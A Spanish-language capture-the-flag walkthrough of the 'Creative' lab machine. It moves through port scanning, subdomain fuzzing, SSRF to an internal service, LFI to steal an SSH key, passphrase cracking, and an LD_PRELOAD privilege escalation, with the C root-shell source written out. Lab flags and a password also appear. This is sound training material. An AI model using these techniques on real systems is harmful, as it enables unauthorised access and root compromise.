
***1. Escaneo 

**como primer punto empezaremos con la fase de escaneo de puertos como herramienta utilizare la herramienta [[nmap]] 

```
nmap -p- --open -n -Pn -T4 --min-rate 8000 -sVC -sS <HOST> -oN <name> -vvv
```

**podemos ver que tenemos los puertos abiertos ``22/ssh`` y el ``80/http`` 

```
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**ahora vamos a utilizar la herramienta ==whatwheb== haber si encontramos algo 

```
whatwheb <HOST>
```

**nos da error ya que tiene un dominio  , a el ingresar ==whatwheb== con el dominio igual no encontramos nada 

```
http://creative.thm [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@example.com,info@website.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.134.13], JQuery[3.4.1], Meta-Author[Devcrud], PasswordField, Script, Title[Creative Studio | Free Bootstrap 4.3.x template], YouTube, nginx[1.18.0]
```


**a el revidar el protocolo ``http`` podemos ver una pagina web 

![[creativo.png]]

**vamos a hacer enumeración de directorios ocultos con ``ffuf``

```
ffuf -u http://creative.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200
```

**solo encontré este directorio oculto ``assets`` y no veo nada mas ahora vamos a enumerar ==subdominios== 

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://creative.thm -H "HOST:FUZZ.creative.thm" -fw 6

```

**y encontramos el subdomino ``beta`` , lo agregamos a el ``/etc/hosts`` y revisamos a ver y nos encontramos con una pagina de URL BETA   , puede que nos hallamos encontrado con un ``SSRF`` (Falsificación  del lado del servidor)

![[creativo2.png]]

**a el ingresar el ``http://127.0.0.1`` nos manda a la pagina de creativo , probaremos y ataque de fuerza bruta a puertos a ver si encontramos un servidor web interno con ``ffuf``

**primero vamos a agregar los ``65535`` a un archivo 

```
seq 65535 > puertos.txt
```

**luego vamos a hacer el ataque con ``ffuf``

```
ffuf  -w port.txt  -u http://beta.creative.thm  -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3    

```

**y como resultado tenemos 2 puertos 

```
80                      
1337 
```

**bien podemos ver que en el puerto ``1337`` contiene un servidor oculto y nos encontramos con LFI(inclusión de archivos locales)

![[creativo3.png]]

**y como resultado

![[creativo4.png]]

**vemos que tenemos un usuario llamado ``saad `` y nos permite ver su ``id_rsa``

![[creativo5.png]]


**parece que la llave privada nos pide password así que en este caso vamos a usar la herramienta ``ssh2john`` para generar el hash de la password de la llave

```
ssh2john id_rsa > password.txt
```

**luego vamos a usar ``john the ripper `` para crackear la password

```
john --wordlist==/usr/share/wordlists/rockyou.txt passwd.txt 

```

**y como resultado obtenemos la password de la llave ``sweetness  ``

**con eso ya podemos entrar a ssh con el usuario ``saad``


**una vez dentro obtener la primera flag ``9a1ce90a7653d74ab98630b47b8b4a84``

***2. escalada de privilegios 


**a el revisar el  ``.bash_history`` podemos encontrar la password de saad

```
saad:MyStrongestPasswordYet$4291
```

**ahora podemos usar el comando ``sudo -l`` y podemos ver que podemos escalar con ``env_keep+=LD_PRELOAD``

***1. nos pasamos a /tmp

**creamos un archivo en ``c`` y le agregamos este código
```
#include <stdio.h>
#include <sys/types.h> 
#include <stdlib.h> 
void _init() { unsetenv("LD_PRELOAD"); 
setgid(0); 
setuid(0); 
system("/bin/sh"); 
}
```

***2. lo compilamos 

```
gcc -fPIC -shared -o name.so name.c -nostartfiles
```

**verificamos que el ``name.so`` se creo correctamente 

```
ls -la name.so
```

**una vez creado correctamente lo ejecutamos con ``ping``

```
sudo LD_PRELOAD=/tmp/name.so ping
```

**listo hemos escalado nos movemos a la carpeta donde se encuentra la flag y la obtenemos ``992bfd94b90da48634aed182aae7b99f``

***y con esto concluimos la maquina creative

